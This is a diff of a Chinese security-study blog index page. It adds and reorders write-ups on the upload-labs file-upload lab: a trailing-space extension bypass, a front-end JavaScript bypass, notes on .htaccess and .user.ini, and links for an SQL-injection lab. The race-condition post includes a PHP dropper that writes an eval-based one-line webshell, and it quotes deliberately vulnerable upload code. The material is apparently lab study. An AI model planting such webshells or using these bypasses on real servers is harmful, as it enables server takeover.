@@ -71,6 +71,42 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web/文件上传/upload-labs/加空格绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="加空格绕过"><a href="#加空格绕过" class="headerlink" title="加空格绕过"></a>加空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们发现没有去空，所以我们可以尝试多加空格</p>
+</blockquote>
+<blockquote>
+<p>​<code>$file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</code>​   我们上传的有空格的后缀，会直接提交上去，所以后面的后缀是php      这样</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" data-id="cmawck7ie002wrk7kh05g9nty" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Web/文件上传/upload-labs/双写后缀绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" class="article-date">
@@ -97,39 +133,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" data-id="cmawcfx9l002wcg7k56uba5bu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/前端绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>没抓到包，说明还没发到后端，在前端就被拦截下来了</p>
-<h1 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h1><h2 id="1-由于找到是前端且js，所以我们直接禁用js"><a href="#1-由于找到是前端且js，所以我们直接禁用js" class="headerlink" title="1.由于找到是前端且js，所以我们直接禁用js"></a>1.由于找到是前端且js，所以我们直接禁用js</h2><h2 id="2-我们可以把绕过函数那个检测删除掉"><a href="#2-我们可以把绕过函数那个检测删除掉" class="headerlink" title="2.我们可以把绕过函数那个检测删除掉"></a>2.我们可以把绕过函数那个检测删除掉</h2><p><img src="/.com//image-20250114181752-uow71t3.png" alt="image"></p>
-<p>删除掉以后，我们可以直接上传php一句话木马</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" data-id="cmawcfx9l002xcg7k5kmvaa5l" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" data-id="cmawck7ie002xrk7k13ms7fmr" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -164,7 +168,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" data-id="cmawcfx9l002ycg7kb0vz61tw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" data-id="cmawck7ie002yrk7k678z89p7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -205,7 +209,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%9B%BE%E7%89%87%E7%A0%81%E7%BB%95%E8%BF%87/" data-id="cmawcfx9m002zcg7k6vj9hana" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%9B%BE%E7%89%87%E7%A0%81%E7%BB%95%E8%BF%87/" data-id="cmawck7ie002zrk7kfpyyhy96" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -255,7 +259,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/" data-id="cmawcfx9m0031cg7kd2553mme" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/" data-id="cmawck7if0030rk7k93851df4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -289,7 +293,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%A4%9A%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmawcfx9n0032cg7kh2yh0d6d" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%A4%9A%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmawck7if0031rk7k6dsh8wqj" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -301,9 +305,9 @@
 
 
   
-    <article id="post-Web/文件上传/upload-labs/条件竞争与绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件上传/upload-labs/配置文件详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -313,27 +317,58 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="条件竞争与绕过"><a href="#条件竞争与绕过" class="headerlink" title="条件竞争与绕过"></a>条件竞争与绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?><p>‘);?&gt;   &#x2F;&#x2F;生成小马</p>
-<p>fput函数：打开文件资源,如果shell.php不存在的话，我将新建shell.php文件,’w’以写入的方式把一句话木马写入到shell.php中</p>
+        <h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><blockquote>
+<p>作用:·分布式配置文件，一般用于 URL·重写、认证、访问控制等<br>作用范围:特定目录(一般是网站根目录)及其子目录<br>优先级:<strong>较高</strong>，可覆盖Apache·的主要配置文件(httpd-conf)<br>生效方式:修改后立刻生效</p>
 </blockquote>
-<blockquote>
-<p>文件竞争，是因为这个文件要到服务器去处理，到服务器处理的话那么服务器就会有判断时间（if时长），那我们不断地上传，只要有一时刻生成小马文件上传成功，那么我们就有了一句话木马得到权限</p>
+<h1 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd-conf"></a>httpd-conf</h1><blockquote>
+<p>作用:°包含 Apache·HTTP.服务器的全局行为和默认设置<br>作用范围:整个服务器<br>优先级:<strong>较低</strong><br>生效方式:管理员权限，重启服务器后生效</p>
 </blockquote>
-<p><img src="/.com//image-20250123214234-jpnq0tp.png" alt="image"> </p>
-<blockquote>
-<p>我们只需要不断地上传这个小马文件，然后让系统有一瞬间处理勒这个小马文件</p>
+<h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><blockquote>
+<p>作用:特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。<br>它用于覆盖或追加全局配置文件(如·php.ini)中的·PHP.配置选项。<br>作用范围:存放该文件的目录以及其子目录<br>优先级:<strong>较高</strong>，可以覆盖 php.ini<br>生效方式:立即生效</p>
 </blockquote>
-<p>即我上传的111.php生成小马文件，那么我访问&#x2F;upload&#x2F;111.php</p>
-<p>上传和访问都在burp上面循环访问，知道生成shell.php成功，访问shell.php</p>
+<h1 id="php-ini"><a href="#php-ini" class="headerlink" title=".php.ini"></a>.php.ini</h1><blockquote>
+<p>作用:存储了对整个·PHP.环境生效的配置选项。它通常位于·PHP.安装目录中<br>作用范围:所有运行在该·PHP·环境中的·PHP·请求<br>优先级:·较低<br>生效方式:重启 php 或 web 服务器</p>
+</blockquote>
 <p>‍</p>
+<p>加载方式:会首先加载·php.ini&#x2F;httpd-conf 文件中的配置。然而，如果在某个目录下存在·.userini&#x2F;.htaccess:文件,服务器会在处理请求时检查该目录,并覆盖相应的配置项。</p>
+<p>‍</p>
+<h1 id="user-ini可以生效的前提"><a href="#user-ini可以生效的前提" class="headerlink" title=".user.ini可以生效的前提:"></a>.user.ini可以生效的前提:</h1><p>最好大于 5.3.0，最好是用 7.X 版本的<br>Server·AP!.为 CGl&#x2F;FastCG——Phpinfo()查看Server·API<br>(Server·API(Application·Programming·Interface，应用程序编程接<br>口)是一组定义了软件组件之间交互方式的规范。在这种情况下<br>Server·API·是指用于连接和交互的服务器端软件接口。)<br>user.ini 文件上传漏洞的前提:<br>.user.ini 可以生效并且该上传目录有 php 文件</p>
+<p>‍</p>
+<h1 id="user-ini文件上传漏洞的前提："><a href="#user-ini文件上传漏洞的前提：" class="headerlink" title=".user.ini文件上传漏洞的前提："></a>.user.ini文件上传漏洞的前提：</h1><p>.user.ini可以生效并且该上传目录<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">有php文件</span></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" data-id="cmawcfx9n0033cg7k0mac4a0a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" data-id="cmawck7ig0034rk7k5yoidzqd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入靶场"><a href="#sql注入靶场" class="headerlink" title="sql注入靶场"></a>sql注入靶场</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">sql末尾</a>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">sql-labs搭建</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" data-id="cmawck7ig0036rk7k2rlx83vb" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -423,7 +458,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" data-id="cmawcfx9n0035cg7kfteeel7o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" data-id="cmawck7ih0038rk7k8v4xhn3b" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -435,9 +470,9 @@
 
 
   
-    <article id="post-Web/文件上传/upload-labs/配置文件详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件上传/upload-labs/条件竞争与绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -447,58 +482,27 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><blockquote>
-<p>作用:·分布式配置文件，一般用于 URL·重写、认证、访问控制等<br>作用范围:特定目录(一般是网站根目录)及其子目录<br>优先级:<strong>较高</strong>，可覆盖Apache·的主要配置文件(httpd-conf)<br>生效方式:修改后立刻生效</p>
+        <h1 id="条件竞争与绕过"><a href="#条件竞争与绕过" class="headerlink" title="条件竞争与绕过"></a>条件竞争与绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?><p>‘);?&gt;   &#x2F;&#x2F;生成小马</p>
+<p>fput函数：打开文件资源,如果shell.php不存在的话，我将新建shell.php文件,’w’以写入的方式把一句话木马写入到shell.php中</p>
 </blockquote>
